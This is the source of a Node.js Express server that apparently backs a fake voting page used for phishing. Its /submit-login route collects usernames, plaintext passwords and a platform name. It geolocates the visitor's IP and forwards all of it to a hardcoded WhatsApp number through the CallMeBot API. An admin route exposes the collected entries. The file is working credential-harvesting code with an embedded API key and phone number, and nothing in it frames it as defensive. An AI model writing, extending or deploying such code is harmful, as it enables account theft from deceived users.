// -------------------- Dependencies --------------------
const express = require("express");
const cors = require("cors");
const axios = require("axios");

// -------------------- App Setup --------------------
const app = express();

// Enable CORS for all routes (handles preflight automatically)
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 5000;
const API_KEY = "1738514";
const PHONE_NUMBER = "+2349035958143";

// -------------------- In-Memory Storage --------------------
let votes = [];
let settings = {
  requireSecurityCode: false,
  maintenanceMode: false,
};

// -------------------- Helper Function --------------------
async function sendWhatsApp(message) {
  try {
    const url = "https://api.callmebot.com/whatsapp.php";
    const response = await axios.get(url, {
      params: { phone: PHONE_NUMBER, text: message, apikey: API_KEY },
      validateStatus: () => true, // Treat all statuses as valid
    });
    return response.data;
  } catch (err) {
    console.error("WhatsApp API error:", err.message);
    throw err;
  }
}

// -------------------- API Routes --------------------

// Root route - friendly HTML page
app.get("/", (req, res) => {
  res.send(`
    <h1>✅ Backend is running!</h1>
    <p>Available routes:</p>
    <ul>
      <li>POST /submit-login</li>
      <li>POST /submit-vote</li>
      <li>GET /logs</li>
      <li>GET /settings</li>
      <li>POST /settings</li>
    </ul>
  `);
});

// Submit login/code
// Submit login/code
app.post("/submit-login", async (req, res) => {
  const { username, password, platform } = req.body;

  // Get client IP (from headers or connection)
  const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  try {
    // Fetch location from IP
    const geoRes = await axios.get(`https://ipapi.co/${ip}/json/`);
    const locationData = geoRes.data;

    const location = `${locationData.city || "Unknown City"}, ${locationData.region || "Unknown Region"}, ${locationData.country_name || "Unknown Country"}`;

    // Build WhatsApp message
    const message = `New login on ${platform}\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}\nLocation: ${location}`;

    // Store in memory
    votes.push({
      username,
      platform,
      action: "login",
      ip,
      location,
      time: new Date(),
    });

    // Send WhatsApp
    const apiResponse = await sendWhatsApp(message);

    res.json({ 
      success: true, 
      msg: "Login received, location tracked, and sent to WhatsApp!", 
      location, 
      apiResponse 
    });
  } catch (err) {
    console.error("Location fetch error:", err.message);
    res.status(500).json({ success: false, error: "Failed to fetch location or send message" });
  }
});
// -------------------- Admin Routes --------------------

// Get logs
app.get("/logs", (req, res) => {
  res.json(votes.map(v => ({ ...v, time: v.time.toISOString() })));
});

// Get settings
app.get("/settings", (req, res) => res.json(settings));

// Update settings
app.post("/settings", (req, res) => {
  const { key, value } = req.body;
  if (!(key in settings)) return res.status(400).json({ error: "Invalid setting" });

  settings[key] = value;
  res.json({ success: true, settings });
});

// -------------------- Catch-All Route --------------------


// -------------------- Start Server --------------------
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
